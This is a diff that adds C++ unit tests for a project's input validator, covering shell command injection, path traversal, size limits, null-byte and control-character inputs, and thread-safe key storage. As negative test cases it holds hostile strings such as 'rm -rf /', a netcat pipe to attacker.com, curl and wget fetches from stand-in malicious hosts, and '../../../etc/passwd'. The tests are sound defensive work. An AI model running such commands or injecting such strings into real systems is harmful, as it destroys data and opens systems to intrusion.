@@ -6,6 +6,9 @@
 #include "ailib/auth/secure_store.hpp"
 #include "../../include/cql/api_client.hpp"
 #include "../../include/cql/template_manager.hpp"
+#include <thread>
+#include <vector>
+#include <atomic>
 
 namespace cql::test {
 
@@ -230,6 +233,151 @@ TEST_F(SecurityTest, ErrorMessageSecurity) {
         // Should contain sanitized information
         EXPECT_NE(error_msg.find("path traversal"), std::string::npos);
     }
+}
+
+// Test command injection prevention (for recent security fixes)
+TEST_F(SecurityTest, CommandInjectionPrevention) {
+    // Test dangerous command sequences
+    EXPECT_FALSE(InputValidator::is_shell_safe("test; rm -rf /"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("test && malicious_command"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("test | nc attacker.com 1234"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("$(curl evil.com/script.sh)"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("`wget malware.com/payload`"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("test > /dev/null; malicious"));
+    
+    // Test complex injection patterns
+    EXPECT_FALSE(InputValidator::is_shell_safe("\")); system(\"rm -rf /\"); //"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("'; exec('evil_command'); #"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("test\nrm -rf /\necho done"));
+    
+    // Safe command patterns should pass
+    EXPECT_TRUE(InputValidator::is_shell_safe("normal file name.txt"));
+    EXPECT_TRUE(InputValidator::is_shell_safe("optimization_result.json"));
+}
+
+// Test filename sanitization (for recent security fixes)
+TEST_F(SecurityTest, FilenameSanitizationEnhanced) {
+    // Test path traversal in filenames
+    std::string dangerous_filename = "../../../etc/passwd";
+    std::string sanitized = InputValidator::sanitize_file_path(dangerous_filename);
+    EXPECT_EQ(sanitized.find(".."), std::string::npos);
+    EXPECT_EQ(sanitized.find("/etc/"), std::string::npos);
+    
+    // Test Windows path traversal
+    std::string windows_dangerous = "..\\..\\Windows\\System32\\config";
+    std::string windows_sanitized = InputValidator::sanitize_file_path(windows_dangerous);
+    EXPECT_EQ(windows_sanitized.find("..\\"), std::string::npos);
+    EXPECT_EQ(windows_sanitized.find("Windows"), std::string::npos);
+    
+    // Test special characters in filenames - validate they are rejected
+    std::string special_chars = "file<>:\"|?*name.txt";
+    EXPECT_THROW(InputValidator::validate_filename(special_chars), SecurityValidationError);
+    
+    // Test length limits
+    std::string long_filename(300, 'a');
+    long_filename += ".txt";
+    EXPECT_THROW(InputValidator::validate_filename(long_filename), SecurityValidationError);
+}
+
+// Test parameter validation (for recent security fixes)
+TEST_F(SecurityTest, ParameterValidationEnhanced) {
+    // Test general parameter validation using existing methods
+    EXPECT_TRUE(InputValidator::is_shell_safe("LOCAL_ONLY"));
+    EXPECT_TRUE(InputValidator::is_shell_safe("CACHED_LLM"));
+    EXPECT_TRUE(InputValidator::is_shell_safe("FULL_LLM"));
+    EXPECT_TRUE(InputValidator::is_shell_safe("ASYNC_LLM"));
+    
+    EXPECT_FALSE(InputValidator::is_shell_safe("FULL_LLM; rm -rf /"));
+    EXPECT_FALSE(InputValidator::is_shell_safe("BALANCED && evil"));
+    
+    // Test safe character validation for domain-like inputs
+    EXPECT_TRUE(InputValidator::contains_only_safe_chars("software", "a-zA-Z0-9_-"));
+    EXPECT_TRUE(InputValidator::contains_only_safe_chars("data-science", "a-zA-Z0-9_-"));
+    EXPECT_TRUE(InputValidator::contains_only_safe_chars("web_development", "a-zA-Z0-9_-"));
+    EXPECT_TRUE(InputValidator::contains_only_safe_chars("machine-learning", "a-zA-Z0-9_-"));
+    
+    EXPECT_FALSE(InputValidator::contains_only_safe_chars("domain; malicious", "a-zA-Z0-9_-"));
+    EXPECT_FALSE(InputValidator::contains_only_safe_chars("domain with spaces", "a-zA-Z0-9_-"));
+    EXPECT_FALSE(InputValidator::contains_only_safe_chars("domain/with/slashes", "a-zA-Z0-9_-"));
+    
+    // Test length-based validation
+    std::string long_domain(100, 'a');
+    EXPECT_GT(long_domain.length(), static_cast<std::size_t>(InputValidator::MAX_CATEGORY_NAME_LENGTH));
+}
+
+// Test resource usage limits
+TEST_F(SecurityTest, ResourceUsageLimits) {
+    // Test memory limits for large inputs
+    std::string massive_input(10 * 1024 * 1024, 'a'); // 10MB string
+    EXPECT_THROW(InputValidator::validate_directive_content("test", massive_input),
+                 SecurityValidationError);
+    
+    // Test reasonable size should pass
+    std::string reasonable_input(1024, 'a'); // 1KB string
+    EXPECT_NO_THROW(InputValidator::validate_directive_content("test", reasonable_input));
+    
+    // Test filename length limits
+    std::string extreme_filename(1000, 'f');
+    extreme_filename += ".txt";
+    EXPECT_THROW(InputValidator::validate_filename(extreme_filename), SecurityValidationError);
+}
+
+// Test concurrent access security
+TEST_F(SecurityTest, ConcurrentAccessSecurity) {
+    // Test that SecureString is thread-safe
+    SecureString shared_key("concurrent_test_key_12345");
+    std::vector<std::thread> threads;
+    std::atomic<int> success_count{0};
+    
+    for (int i = 0; i < 10; ++i) {
+        threads.emplace_back([&shared_key, &success_count]() {
+            try {
+                // Multiple threads accessing the same SecureString
+                std::string data = shared_key.data();
+                if (data == "concurrent_test_key_12345") {
+                    success_count++;
+                }
+                
+                // Test masking in concurrent environment
+                std::string masked = shared_key.masked();
+                if (!masked.empty()) {
+                    success_count++;
+                }
+            } catch (...) {
+                // Any exception means thread safety failure
+            }
+        });
+    }
+    
+    for (auto& t : threads) {
+        t.join();
+    }
+    
+    EXPECT_EQ(success_count.load(), 20); // 10 threads * 2 operations each
+}
+
+// Test edge cases and boundary conditions
+TEST_F(SecurityTest, EdgeCaseSecurity) {
+    // Test null byte injection
+    std::string null_injection = "normal_string";
+    null_injection.push_back('\0');
+    null_injection += "hidden_malicious_content";
+    
+    EXPECT_THROW(InputValidator::validate_filename(null_injection), SecurityValidationError);
+    EXPECT_THROW(InputValidator::validate_api_key(null_injection), SecurityValidationError);
+    
+    // Test unicode and encoding attacks
+    std::string unicode_attack = "file\u0000name.txt"; // Unicode null
+    EXPECT_THROW(InputValidator::validate_filename(unicode_attack), SecurityValidationError);
+    
+    // Test control characters
+    std::string control_chars = "file\x01\x02\x03name.txt";
+    EXPECT_THROW(InputValidator::validate_filename(control_chars), SecurityValidationError);
+    
+    // Test empty and whitespace-only inputs
+    EXPECT_THROW(InputValidator::validate_filename(""), SecurityValidationError);
+    EXPECT_THROW(InputValidator::validate_filename("   "), SecurityValidationError);
+    EXPECT_THROW(InputValidator::validate_filename("\t\n\r"), SecurityValidationError);
 }
 
 } // namespace cql::test
